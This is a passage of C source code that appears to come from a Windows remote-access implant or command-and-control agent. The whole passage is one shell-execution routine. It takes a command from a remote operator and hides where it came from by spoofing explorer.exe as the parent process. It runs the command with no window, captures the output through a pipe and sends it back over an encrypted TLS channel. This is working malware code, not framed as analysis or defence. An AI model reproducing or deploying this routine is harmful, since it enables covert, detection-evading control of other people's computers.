    size_t cmdLen  = strlen(cmd);
    char  *fullCmd = (char *)malloc(cmdLen + 16);
    if (!fullCmd) { _send_str(pTls, "[-] out of memory"); return; }
    _snprintf(fullCmd, cmdLen + 15, "cmd /c %s", cmd);

    /* ── Anonymous pipe ──────────────────────────────────────────────── */
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        free(fullCmd);
        _send_str(pTls, "[-] _shell_exec: CreatePipe failed");
        return;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    /* ── PPID spoof: find explorer.exe ───────────────────────────────── */
    HANDLE hExplorer = NULL;
    {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            if (Process32First(hSnap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                        hExplorer = OpenProcess(PROCESS_CREATE_PROCESS,
                                                FALSE, pe.th32ProcessID);
                        if (hExplorer) break;
                    }
                } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
    }

    /* ── STARTUPINFOEX + attribute list ─────────────────────────────── */
    STARTUPINFOEXA      sie;
    PROCESS_INFORMATION pi;
    ZeroMemory(&sie, sizeof(sie));
    ZeroMemory(&pi,  sizeof(pi));
    sie.StartupInfo.cb         = sizeof(sie);
    sie.StartupInfo.dwFlags    = STARTF_USESTDHANDLES;
    sie.StartupInfo.hStdOutput = hWritePipe;
    sie.StartupInfo.hStdError  = hWritePipe;
    sie.StartupInfo.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    BOOL   useAttr     = FALSE;
    SIZE_T attrListSz  = 0;
    if (hExplorer) {
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSz);
        sie.lpAttributeList =
            (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrListSz);
        if (sie.lpAttributeList &&
            InitializeProcThreadAttributeList(
                sie.lpAttributeList, 1, 0, &attrListSz) &&
            UpdateProcThreadAttribute(
                sie.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hExplorer, sizeof(hExplorer), NULL, NULL)) {
            useAttr = TRUE;
        } else {
            free(sie.lpAttributeList);
            sie.lpAttributeList = NULL;
        }
    }

    DWORD createFlags = CREATE_NO_WINDOW |
                        (useAttr ? EXTENDED_STARTUPINFO_PRESENT : 0);

    BOOL ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE,
                              createFlags, NULL, NULL,
                              (LPSTARTUPINFOA)&sie, &pi);

    if (sie.lpAttributeList) {
        DeleteProcThreadAttributeList(sie.lpAttributeList);
        free(sie.lpAttributeList);
    }
    if (hExplorer) CloseHandle(hExplorer);
    CloseHandle(hWritePipe);   /* close our copy — child exit triggers EOF */
    free(fullCmd);

    if (!ok) {
        CloseHandle(hReadPipe);
        _send_str(pTls, "[-] _shell_exec: CreateProcess failed");
        return;
    }
    CloseHandle(pi.hThread);

    /* ── Read output ─────────────────────────────────────────────────── */
    size_t bufSize = SHELL_RESP_BUF;
    char  *resp    = (char *)calloc(1, bufSize);
    if (!resp) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(hReadPipe);
        _send_str(pTls, "[-] out of memory");
        return;
    }

    size_t used = 0;
    char   chunk[4096];
    DWORD  nRead = 0;
    while (ReadFile(hReadPipe, chunk, sizeof(chunk), &nRead, NULL) && nRead > 0) {
        if (used + nRead + 1 >= bufSize) {
            size_t newSz = bufSize * 2;
            char  *p     = (char *)realloc(resp, newSz);
            if (!p) break;
            resp    = p;
            bufSize = newSz;
        }
        memcpy(resp + used, chunk, nRead);
        used += nRead;
    }
    resp[used] = '\0';

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);

    if (g_cs_init) EnterCriticalSection(&g_tls_cs);
    tls_send_msg(pTls, (const BYTE *)(used ? resp : " "), (DWORD)(used ? used : 1));
    if (g_cs_init) LeaveCriticalSection(&g_tls_cs);
    free(resp);
}
